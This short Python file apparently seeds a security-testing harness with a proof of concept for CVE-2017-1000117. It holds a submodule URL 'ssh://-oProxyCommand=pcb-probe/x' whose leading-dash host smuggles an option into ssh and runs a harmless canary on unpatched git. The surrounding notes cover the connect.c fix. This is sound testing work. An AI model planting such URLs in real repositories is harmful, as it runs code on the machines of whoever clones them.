#!/usr/bin/env python3
"""[GIVEN] CVE-2017-1000117 seed exploit — leading-dash SSH host in a submodule url.

A malicious repository's `.gitmodules` points a submodule at an ssh:// URL whose
HOST begins with '-'. When `git clone --recurse-submodules` fetches the submodule,
git spawns `ssh` with that host as an argv element, so the child ssh parses it as
an option (`-oProxyCommand=<cmd>`) and runs the benign canary.

Contract: reaches the canary on V0 (git 2.13.4); BLOCKED on V1 (git 2.14.1),
because the CVE-2017-1000117 fix in connect.c now rejects a host that
`looks_like_command_line_option()` ("strange hostname '...' blocked"; see
patch.diff). This is the seed the system-under-test is given.
"""
from __future__ import annotations

# ssh host = "-oProxyCommand=pcb-probe" -> option-injected into the spawned ssh.
URL = "ssh://-oProxyCommand=pcb-probe/x"
SMPATH = "sm"


import json

def candidate() -> dict:
    return {"probe_id": "cve-2017-1000117-ssh-host-dash", "url": URL, "path": SMPATH}


if __name__ == "__main__":
    c = candidate()
    print(json.dumps(c, indent=2))
